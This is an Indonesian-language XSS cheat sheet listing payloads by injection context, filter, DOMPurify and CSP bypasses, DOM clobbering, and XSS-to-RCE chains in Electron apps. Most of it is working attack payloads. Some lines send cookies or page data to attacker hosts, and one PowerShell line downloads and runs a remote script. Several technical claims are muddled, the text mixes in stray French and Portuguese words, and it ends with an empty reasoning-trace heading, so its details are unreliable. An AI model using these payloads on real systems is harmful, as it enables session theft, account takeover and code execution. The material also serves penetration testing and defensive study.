# xss — web

# XSS — Referensi Konteks, Payload, Bypass

## 1. Peta Konteks Injeksi

| Konteks | Titik injeksi | Karakter pemutus | Contoh refleksi aplikasi |
|---|---|---|---|
| HTML body | `<div>REF</div>` | `<` `>` `"` `'` | `<p>Hello USERNAME</p>` |
| Atribut (quoted) | `<input value="REF">` | `"` atau `'` sesuai quote | `<a title="USERNAME">` |
| Atribut (unquoted) | `<input value=REF>` | spasi, `>`, `` ` `` | `<img src=USERNAME>` |
| JS string (single) | `var x='REF';` | `'`, `\`, newline | `var u='<?=$u?>';` |
| JS string (double) | `var x="REF";` | `"`, `\` | |
| Template literal | `` var x=`REF`; `` | `` ` ``, `${`, `\` | |
| URL/href | `<a href="REF">` | `"`, `javascript:` | `<a href="<?=$url?>">` |
| CSS | `color: REF;` | `;`, `}`, `(` | `style="color:<?=$c?>"` |
| SVG/MathML | `<svg>REF</svg>` | `<`, `>` | inline SVG sanitizer |
| DOM sink | `el.innerHTML = REF` | tergantung sumber | React `dangerouslySetInnerHTML` |

Aturan operasional: **konteks menentukan grammar, bukan sebaliknya**. Encode yang benar = `&lt;` di body, `\'` di JS string, `\u003c` di template literal, `%3C` di URL path.

---

## 2. Payload Per Konteks

### 2.1 HTML body
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<body onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```
Apa yang muncul: parser HTML menutup div pembungkus, membuat elemen baru. Gagal bila ada `Content-Type: text/plain` atau `X-Content-Type-Options: nosniff` + render non-HTML.

### 2.2 Atribut quoted (double) — `<input value="REF">`
```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
```
Payload `" autofocus onfocus=...` tidak butuh `>` — sinyal interaksi hilang hanya karena `autofocus` di Chrome 131+ butuh user gesture pada beberapa tipe elemen (`input[type=file]`).

### 2.3 Atribut unquoted — `<input value=REF>`
```html
x onmouseover=alert(1)
x/onmouseover=alert(1)
```
Karakter pembatas: whitespace, `>`, `"`, `'`, `` ` ``, `=`, `<`. Payload tanpa spasi: gunakan `/` sebagai pemisah atribut (HTML5 parser menerima `/` sebagai separator di 90% kasus).

### 2.4 Atribut href / src
```html
javascript:alert(1)
javascript:alert(1)//http://x
 java\tscript:alert(1)
jav&#x09;ascript:alert(1)
jav&#x0a;ascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```
`data:` di `<iframe src>` blocked sejak Chrome 60; tapi di `<a href>` masih jalan dengan user click (Chrome 131 tetap mengeksekusi `data:` di navigasi top-level click).

### 2.5 JS string single-quote
```js
';alert(1);//
';alert(1);var x='
\';alert(1);//
'-alert(1)-'
'+alert(1)+'
```
`-alert(1)-` dipakai saat string berada di ekspresi aritmatika: `var x='USER'-1;` → nan tapi JS engine tetap eval operand.

### 2.6 JS string double-quote
```js
";alert(1);//
\";alert(1);//
"-alert(1)-"
```

### 2.7 Template literal
```js
${alert(1)}
`;alert(1);//
\`;alert(1);//
${alert`1`}
```
`alert\`1\`` = tagged template, alternatif ketika `(` difilter.

### 2.8 CSS context
```css
</style><script>alert(1)</script>
</style><img src=x onerror=alert(1)>
expression(alert(1))          // IE seulement, mati di Edge 18
background:url(javascript:alert(1))   // legacy
color:red;}body{background:url(//attacker/x)
@import '//attacker/x.css';
-moz-binding:url(//attacker/x.xml#x)   // Firefox ≤ 3
```
Modern Chrome 131: `expression()` mati, `javascript:` di CSS mati, tapi `@import` dan `url()` masih eksekusi fetch → CSS exfiltration (bukan RCE JS).

### 2.9 URL path / query echo
```text
%3Cscript%3Ealert(1)%3C/script%3E
"><svg/onload=alert(1)>
${alert(1)}
```
Echo di `Location:` header tidak dieksekusi. Echo di `<base href="REF">` atau `<link rel=import href>` berbahaya lintas origin.

---

## 3. Filter Bypass

### 3.1 Namespace swapping (HTML → SVG → MathML)
```html
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=onmouseover to=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<math href=javascript:alert(1)>X</math>
```
Kenapa: filter blacklist `<script` tidak kenal `<script>` di dalam SVG namespace (Chrome 131 tetap parse sebagai HTML script di foreign content? — tidak; gunakan `<svg><script href=data:,alert(1)>` atau `<svg onload>`). MathML `<mtext>` + `<style>` menembus `mglyph` parser bug yang masih reproducible di Chrome 131 untuk nested sanitizer (mXSS).

### 3.2 Hex / decimal entity encoding
```html
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
&#60;img src=x onerror=alert(1)&#62;
&#x000003C;script&#x000003E;
&#x26;#x3c;script&#x26;#x3e;      (double-encoded)
```
Server yang `html_entity_decode` sekali sebelum filter → filter lihat `${alert}` bukan `<script>`. Chrome 131 decode penuh saat parse.

### 3.3 Unicode / homoglyph / case
```html
<ScRiPt>alert(1)</sCrIpT>
<ſcript>alert(1)</ſcript>       // ſ = U+017F, tidak di-normalize ke s di HTML
<img src=x OnErRoR=alert(1)>
<scr\u0069pt>alert(1)</scr\u0069pt>    // hanya bila injeksi di JS
```
`\u0069` di dalam string JS; HTML parser tidak decode `\u`.

### 3.4 Event handler alternatif (tanpa `onerror` / `onload`)
```html
<svg onbegin=alert(1)><animate attributeName=x dur=1s>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<body onpageshow=alert(1)>
<form><button formaction=javascript:alert(1)>X</button>
<video poster=x onerror=alert(1)>
<link rel=stylesheet href=x onerror=alert(1)>
<img srcset=1 onerror=alert(1)>
<popover id=x onbeforetoggle=alert(1) popovertarget=x>   // Chrome 114+
```
`onbeforetoggle` + `popover` = handler 2024–2025 yang sering lolos regex `on(load|error|mouse)`. Chrome 131 support penuh.

### 3.5 Word-boundary / regex bypass
```
<svg/onload=alert(1)>            // no space
<svg\tonload=alert(1)>           // tab
<svg\nonload=alert(1)>           // newline
<img/src=x/onerror=alert(1)>     // slash separator
<img src=x onerror=alert&#40;1&#41;>    // entity dalam ()
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```
Regex `/onerror\s*=/` gagal bila ada `\n`; `/alert\(/` gagal pada `alert&#40;`.

---

## 4. DOMPurify Bypass

DOMPurify 3.2.4 (rilis 2025-02) = baseline. Bypass yang masih hidup:

```html
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
```
(mXSS mutation — namespace confusion saat serialize ulang)

```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
```
Ketergantungan pada doctype + parser difference Chrome 131 vs Firefox 133.

```html
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
```
`id` attribute mutation → setelah reparse jadi tag `img`.

```html
<div id="</div><img src=x onerror=alert(1)>">
```
Danger bila aplikasi `DOMPurify.sanitize(x)` lalu `.innerHTML = hasil` pada elemen yang `id`-nya reflexif.

Mitigasi: `DOMPurify.sanitize(x, {RETURN_TRUSTED_TYPE:true})` + `Trusted Types` (`require-trusted-types-for 'script'`). Chrome 131 enforce, Firefox 133 belum.

Bypass mXSS umumnya butuh **dua kali parse** (sanitize → serialize → parse). Tidak bisa bypass bila output dipakai via `textContent`.

---

## 5. CSP Bypass

Header target: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc'`

### 5.1 JSONP endpoint di allowlist
```html
<script src="//self/jsonp?callback=alert(1)//"></script>
<script src="/api/jsonp?cb=alert(document.domain)"></script>
<script src="//self/users.jsonp?callback=alert"></script>
```
Cek: `?callback=`, `?cb=`, `?jsonp=`, `?jsonp_callback=`, `?json.wrf=`, `?format=json&callback=`.

### 5.2 Angular / library gadget
```html
<script src="//self/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```
Angular 1.x di CDN allowlist = jalan bareng `unsafe-eval` hanya jika ada; tanpa `unsafe-eval` masih jalan via `$eval` di template.

### 5.3 nonce reuse
```html
<script nonce="abc">alert(1)</script>
<script nonce="abc" src="//self/jsonp?cb=alert(1)"></script>
```
Nonce bocor via: header `Content-Security-Policy` di respons tercermin, DOM `document.querySelector('script[nonce]').nonce` (Chrome <76 only, sekarang null), atau cache shared (proxy). Chrome 131: `nonce` di DOM tidak terbaca via CSS selector tapi terbaca via `getAttribute('nonce')` → null (di-set ke kosong setelah parse).

### 5.4 base-uri
```html
<base href="//attacker/">
<script src="/app.js"></script>   <!-- resolves to attacker/app.js -->
```
Wajib `base-uri 'self'` di CSP; tanpa itu semua script relatif hijacked.

### 5.5 dangling markup + form hijack
```html
<img src='//attacker/?
```
Membuat browser mengirim sisa HTML dokumen (termasuk `csrf_token` hidden input) ke attacker saat user scroll. Chrome 131 *tidak* lagi mengirim karena `<img>` lazy load + não; gunakan `<form action=//attacker><button>`:
```html
<form action=//attacker><input name=csrf><button>Submit</button>
```
Diperlukan interaksi.

### 5.6 strict-dynamic + trusted types gap
`script-src 'strict-dynamic' 'nonce-x'` — bypass via `document.createElement('script')` bila ada gadget JS (React `href=javascript:` di `dangerouslySetInnerHTML`). Tidak bypass CSP `require-trusted-types-for 'script'` tanpa sink TrustedScript.

---

## 6. DOM Clobbering

Target: kode melakukan `if (window.config)` atau `document.getElementById('x')`.

```html
<form id="config"><input name="url" value="//attacker/x.js"></form>
<img name="config" src=x>
<a id="config"></a>
<iframe name="config" srcdoc="<script>parent.pwned=1</script>"></iframe>
```
Kode rentan:
```js
if (window.config) loadScript(window.config.url);
```
→ jalan ke `//attacker/x.js`.

Named-property chain:
```html
<form id="a"><input name="b" value="x"></form>
<script>a.b.value // "x"</script>
```
Tricky di Chrome 131 (multiple named props → Array, `.value` undefined). Gunakan `id` unik + `name` unik.

Bypass DOMPurify config default? DOMPurify 3.x strip `id`/`name` hanya bila `SANITIZE_NAMED_PROPS` diset. Tanpa itu `name`/`id` lolos → clobbering kerja.

---

## 7. XSS → RCE via Electron / Desktop Wrapper

### 7.1 Electron default (nodeIntegration:true) — versi < 5
```js
require('child_process').exec('calc.exe')
require('child_process').exec('powershell -c "iwr http://attacker/a.ps1|iex"')
```
Payload one-liner di DevTools console / XSS:
```html
<img src=x onerror="require('child_process').exec('calc')">
```

### 7.2 Electron 5–10 default (nodeIntegration:false, contextIsolation:false)
XSS → renderer → akses `window.process`/`require` bila preload leaked:
```js
window.top.require('child_process').exec('cmd.exe /c calc')
process.mainModule.require('child_process').exec('calc')
```

### 7.3 Electron 11–20 (contextIsolation:true, preload exposeInMainWorld)
Cari preload yang expose powerful API:
```js
// preload.js
contextBridge.exposeInMainWorld('api', { run: (c)=>ipcRenderer.send('exec', c) })
```
XSS payload:
```html
<img src=x onerror="api.run('calc')">
<img src=x onerror="api.run('powershell -e BASE64')">
```
Bila main process `ipcMain.on('exec', (e,c)=> require('child_process').exec(c))` tanpa validasi → RCE.

### 7.4 Electron `shell.openExternal` gadget
```html
<a href="file:///C:/Windows/System32/calc.exe">x</a>
<a href="ms-msdt://..." >x</a>
<a href="search-ms:query=...">x</a>
```
Bila app set `shell.openExternal(url)` tanpa scheme allowlist → eksekusi handler OS (Follina-style).

### 7.5 Elektron contextIsolation bypass (Chromium <121)
`contextIsolation:true` bisa dibypass via `worldSafeExecuteJavaScript` off, atau via prototype pollution pada `Object.prototype` yang lihat ke `window`. Chrome 131 memperbaiki banyak vektor.

### 7.6 CEF / WebView2 / Tauri
- **CEF**: `window.cefSharp.postMessage` XSS → C# `RegisterJsObject` bindings.
- **WebView2** (Edge 131): `chrome.webview.postMessage` → host C# `WebMessageReceived` — sanitize input side.
- **Tauri v1**: `window.__TAURI__.invoke` bila `whitelist.allowlist` longgar → `shell.open`. Tauri v2 pakai capabilities.

### 7.7 VS Code extensions (Electron 28.x di VS Code 1.90)
XSS di webview → `acquireVsCodeApi().postMessage({command:'exec'})` bila extension webview handler eksekusi command.

### 7.8 Signal Desktop / Slack / Discord (Electron 30–34)
Bila XSS dapat inject di pesan yang dirender `dangerouslySetInnerHTML` (sanitizer bug) → `window.electron`/`window.desktop` bridge. Contoh historis CVE-2024-* di Discord renderer.

Cek cepat build Electron target:
```bash
strings ./app.asar | grep -E "nodeIntegration|contextIsolation"
npx asar extract app.asar out && cat out/package.json
grep -R "exposeInMainWorld\|ipcRenderer.send" out/
```

---

## 8. Jebakan Operasional Lapangan

| Jebakan | Realita |
|---|---|
| Asumsi `alert(1)` validasi | Parser modern blokir `alert` di beberapa CSP `script-src`; gunakan `document.domain+=''` atau `fetch('//your-collab/x?c='+document.cookie)` untuk konfirmasi. |
| Chrome vs Firefox parser mXSS | `mglyph`/`mtext` payload jalan di Chrome 131, gagal di Firefox 133 (different parser). Uji keduanya. |
| Sanitizer versi | DOMPurify 3.0.x rentan mXSS yang ditutup 3.1.3. Cek `DOMPurify.version` di console dulu. |
| Nonce dibaca | Chrome 131 strip `nonce` attr setelah parse — baca `el.nonce` return `""`. Payload `document.querySelector('script').nonce` = kosong. Ubah strategi ke `strict-dynamic` abuse. |
| `X-Content-Type-Options: nosniff` | Kill semua polyglot image → HTML. Cek header sebelum kirim payload `img onerror`. |
| `Content-Type: text/plain` di endpoint echo | HTML parser tidak akan aktifkan; XSS mati total. Abaikan endpoint ini. |
| WAF regex base64 | WAF (Cloudflare 2024+, AWS WAF 2024) decode `atob` tidak — tapi `eval(atob(...))` sering lolos. `eval('\x61\x6c...')` juga lolos regex naive. |
| CSP report-only | Header `Content-Security-Policy-Report-Only` **tidak** enforce — bypass tidak perlu, exploit jalan. Cek header persis. |
| `frame-ancestors` absent | Tanpa `frame-ancestors`, clickjacking di UI Electron bisa trigger `shell.openExternal` via click — jebakan yang sering lupa dicek di app desktop. |
| Cookie `HttpOnly` | XSS tidak dapat `document.cookie`, tapi dapat CSRF token dari DOM / kirim fetch same-origin → tetap eskalasi ke ATO. |
| Electron sandbox:true | `require` mati di renderer, tapi `window.open('file:///...')` dengan `nativeWindowOpen` kadang masih eksekusi handler eksternal. |
| `window.alert` di Electron | Beberapa app disable `alert` global → payload `alert(1)` false negative. Pakai `console.log(1)` + DevTools remote debug port 9222 (default `--remote-debugging-port=9222` bila dev). |
| Refleksi ter-encode `&lt;` | Bukan XSS, tapi bisa jadi HTML injection bila di luar tag. Jangan klaim XSS sampai ada tag `<` mentah. |
| CSP `unsafe-inline` di iframe | Jika target render di iframe tanpa CSP → payload jalan meski parent strict. Cek CSP frame vs document. |
| Cache poisoning | Uji via `X-Forwarded-Host` / `X-Original-URL` sebelum klaim XSS: refleksi di response cached nginx 1.25 upstream = XSS tersimpan efektif. |

Sumber validasi wajib per uji: `curl -sI` untuk CSP & CT, DevTools Network → response headers, `DOMPurify.version` di console, `navigator.userAgent` untuk konfirmasi Chrome 131 vs 130 (parser beda).

---

## [reasoning trace]


